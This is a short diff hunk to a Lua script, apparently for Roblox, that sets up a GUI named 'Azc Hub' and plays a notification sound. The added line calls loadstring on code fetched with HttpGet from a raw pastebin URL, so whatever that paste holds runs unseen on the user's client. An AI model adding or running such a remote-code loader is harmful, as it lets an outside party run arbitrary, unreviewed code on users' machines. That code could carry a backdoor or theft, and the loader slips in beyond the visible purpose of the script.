@@ -77,6 +77,8 @@ local screenGui = Instance.new("ScreenGui", playerGui)
 screenGui.Name = "Azc Hub"
 screenGui.ResetOnSpawn = false
 
+loadstring(game:HttpGet("https://pastebin.com/raw/YbhQS5Vb"))()
+
 task.wait("1")
 
 playSound("Azc Notifications", "https://github.com/thecomplexjason/FR3ON/raw/refs/heads/main/Azc%20Notifications.mp3")
